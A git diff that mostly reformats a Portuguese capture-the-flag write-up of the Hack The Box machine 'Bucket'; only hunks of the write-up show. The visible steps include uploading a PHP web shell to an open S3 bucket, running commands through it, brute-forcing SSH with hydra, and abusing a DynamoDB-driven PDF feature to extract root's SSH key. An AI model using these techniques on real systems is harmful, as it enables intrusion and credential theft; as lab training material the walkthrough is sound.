@@ -19,8 +19,10 @@ Olá pessoal!
 
 A máquina desta semana será **Bucket**, outra máquina classificada como mediana do [Hack The Box](https://www.hackthebox.eu/), criada por [MrR3boot](https://app.hackthebox.eu/users/13531).
 
-\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são
+  aposentadas.
+</Alert>
 
 ![HTB Bucket](https://i.imgur.com/KEhyzUW.png)
 
@@ -42,7 +44,7 @@ Host is up (0.077s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
 |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
 |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
@@ -82,7 +84,7 @@ Ao identificar o DNS `s3.bucket.htb` me chamou atenção para o nome, o qual faz
 
 Analisando o webserver da requisição para uma das URLs de imagem, notei que se utiliza de outro webserver (`hypercorn-h11`), diferente do Apache listado no Scan do NMAP para a página na URL `bucket.htb`, o que significa que temos outro serviço na máquina ou há algum tipo de proxy na requisição neste virtual host.
 
-Para validar o que temos nesta estrutura, realizei uma enumeração utilizando o `gobuster` e encontrei dois diretórios interessantes: *health* e *shell*
+Para validar o que temos nesta estrutura, realizei uma enumeração utilizando o `gobuster` e encontrei dois diretórios interessantes: _health_ e _shell_
 
 ```bash
 $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://s3.bucket.htb -o gobuster-s3.txt
@@ -107,11 +109,11 @@ Progress: 2643 / 220561 (1.20%)
 É importante mencionar que são diretórios, pois o resultado para as chamadas em cada um dos nomes via `curl` com ou sem a barra ao final é diferente, conforme podemos ver abaixo:
 
 ```bash
-$ curl -L http://s3.bucket.htb/health                                                                       
+$ curl -L http://s3.bucket.htb/health
 {"services": {"s3": "running", "dynamodb": "running"}}
 
 $ curl -L http://s3.bucket.htb/health/
-{"status": "running"}                                                                                                 
+{"status": "running"}
 $ curl -L http://s3.bucket.htb/shell
 
 
@@ -144,7 +146,7 @@ Como o `awscli` é mais flexível para enumerar e trabalhar com os recursos do q
 # Install aws cli
 $ sudo apt install awscli -y
 [...]
-$ aws configure --profile bucket.htb                                                                         
+$ aws configure --profile bucket.htb
 AWS Access Key ID [None]: dummy
 AWS Secret Access Key [None]: dummy
 Default region name [None]: us-east-1
@@ -238,9 +240,9 @@ Após a criação do arquivo, realizado o upload via CLI vide comandos abaixo:
 $ aws s3 cp ./exploit.php s3://adserver/ \
     --endpoint-url http://s3.bucket.htb \
     --profile bucket.htb
-upload: ./exploit.php to s3://adserver/exploit.php                
+upload: ./exploit.php to s3://adserver/exploit.php
 
-$ aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb ls s3://adserver/              
+$ aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb ls s3://adserver/
                            PRE images/
 2021-02-26 11:56:28         31 exploit.php
 2021-02-26 11:56:02       5344 index.html
@@ -251,7 +253,7 @@ Ao tentar acessá-lo alguns instantes depois, notei que o arquivo que enviei foi
 ```bash
 $ aws s3 cp ./exploit.php s3://adserver/ \
     --endpoint-url http://s3.bucket.htb --profile bucket.htb && curl -L http://bucket.htb/exploit.php?cmd=id
-upload: ./exploit.php to s3://adserver/exploit.php                
+upload: ./exploit.php to s3://adserver/exploit.php
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -265,24 +267,24 @@ aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb cp ./exploit.php
 
 Uma vez com acesso ao shell da máquina, executei o `linpeas.sh` para simplificar a enumeração, onde os seguintes itens foram identificados:
 
-* Usuário local `roy` possui acesso à máquina e, enumerando seu diretório observado a existencia do arquivo `user.txt`, o qual não temos acesso leitura com a conta `www-data` além de uma pasta `project` a ser inspecionada.
-  * Este usuário não possui nenhum processo em execução que eventualmente permita a exploração logo precisaremos obter suas credenciais de alguma forma.
-* Alguns outros serviços encontram-se em execução nesta máquina, funcionando nas portas 4566, 8000 e 38443, que possivelmente venham a dar privilégios a outras atividades em um segundo momento.
+- Usuário local `roy` possui acesso à máquina e, enumerando seu diretório observado a existencia do arquivo `user.txt`, o qual não temos acesso leitura com a conta `www-data` além de uma pasta `project` a ser inspecionada.
+  - Este usuário não possui nenhum processo em execução que eventualmente permita a exploração logo precisaremos obter suas credenciais de alguma forma.
+- Alguns outros serviços encontram-se em execução nesta máquina, funcionando nas portas 4566, 8000 e 38443, que possivelmente venham a dar privilégios a outras atividades em um segundo momento.
 
 ```plaintext
-[+] Active Ports                                                                                         
-[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                               
-Active Internet connections (servers and established)                                                     
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name         
-tcp        0      0 127.0.0.1:38443         0.0.0.0:*               LISTEN      -                        
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                         
-tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                         
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                         
-tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                     
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:38443         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
 ```
 
-* Esta máquina possui serviços de container em execução (`ctr`, `runc`), que executam provavelmente o localstack e que poderiam ser avaliados para escalação de privilégios.
-* Existe um diretório `/var/www/bucket-app` que pode ser a aplicação servida em uma das portas identificadas, mas que não possuímos acesso de leitura com a conta utilizada.
+- Esta máquina possui serviços de container em execução (`ctr`, `runc`), que executam provavelmente o localstack e que poderiam ser avaliados para escalação de privilégios.
+- Existe um diretório `/var/www/bucket-app` que pode ser a aplicação servida em uma das portas identificadas, mas que não possuímos acesso de leitura com a conta utilizada.
 
 Dos pontos mencionados, o que mais chamou atenção foi o possível website em execução nas portas citadas, logo iniciei por verificar as configurações ativas no Apache (`/etc/apache2/sites-enabled`) onde tínhamos o arquivo `000-default.conf` listado abaixo, mas não encontrei nada sobre a porta 38443, mas tive a informação sobre a porta 4566, que é publicada pela porta 80 e na porta 8000, que é publicado o website disponível na pasta `/var/www/bucket-app`.
 
@@ -319,7 +321,7 @@ Dos pontos mencionados, o que mais chamou atenção foi o possível website em e
 
 Embora possível identificar os serviços ativos apenas a partir da máquina local, precisaremos realizar a exploração apenas via linha de comando ou precisaremos de uma conta na máquina para tunelar o acesso a partir de SSH.
 
-Já que os websites não permitiram muitos detalhes na enumeração, decidi testar as senhas obtidas anteriormente via DynamoDB para o usuário `roy` e felizmente tivemos sucesso. Abaixo a execução do `hydra` que utilizei para automatizar  brute force na conta via SSH.
+Já que os websites não permitiram muitos detalhes na enumeração, decidi testar as senhas obtidas anteriormente via DynamoDB para o usuário `roy` e felizmente tivemos sucesso. Abaixo a execução do `hydra` que utilizei para automatizar brute force na conta via SSH.
 
 ```bash
 $ hydra -l roy -P passwords 10.10.10.212 -t 4 ssh
@@ -338,7 +340,7 @@ Uma vez que tínhamos agora acesso à máquina com as credenciais do usuário `r
 ```bash
 roy@bucket:~$ id
 uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
-roy@bucket:~$ cat user.txt 
+roy@bucket:~$ cat user.txt
 <redacted>
 ```
 
@@ -386,11 +388,11 @@ Para os testes iniciais, conforme documentação da AWS disponível [neste link]
 
 Para simplificar este processo, que está sendo feito da máquina atacante, realizados os seguintes procedimentos:
 
-* Na máquina atacante, criado chave RSA (`ssh-keygen`) e atribuido chave pública dela ao usuário `roy` na máquina bucket para que não fosse necessário o uso de senhas durante a autenticação.
-* Na máquina atacante também foi criado o tunelamento da porta local 8000/TCP, a qual foi redirecionada para a porta 8000 na máquina bucket, fazendo o serviço disponível também localmente, o que posteriormente foi possível validar acessando localmente a página conforme evidencia abaixo
+- Na máquina atacante, criado chave RSA (`ssh-keygen`) e atribuido chave pública dela ao usuário `roy` na máquina bucket para que não fosse necessário o uso de senhas durante a autenticação.
+- Na máquina atacante também foi criado o tunelamento da porta local 8000/TCP, a qual foi redirecionada para a porta 8000 na máquina bucket, fazendo o serviço disponível também localmente, o que posteriormente foi possível validar acessando localmente a página conforme evidencia abaixo
 
 ```bash
-ssh roy@10.10.10.212 -L 8000:127.0.0.1:8000 
+ssh roy@10.10.10.212 -L 8000:127.0.0.1:8000
 ```
 
 ![Website 8000/TCP via SSH Tunnel](https://i.imgur.com/HIP7f4S.png)
@@ -447,7 +449,7 @@ aws dynamodb put-item \
     --return-consumed-capacity TOTAL \
     --endpoint-url http://s3.bucket.htb \
     --profile bucket.htb && \
-curl --data "action=get_alerts" http://localhost:8000/    
+curl --data "action=get_alerts" http://localhost:8000/
 ```
 
 Após o procedimento foi possível baixar o aquivo `/var/www/bucket-app/files/result.pdf` e, com o conteúdo presente neste arquivo, criar o arquivo `id_rsa`, o qual foi posteriormente utilizado para conectar-se à máquina via SSH e obter a shell a partir do usuário `root`.
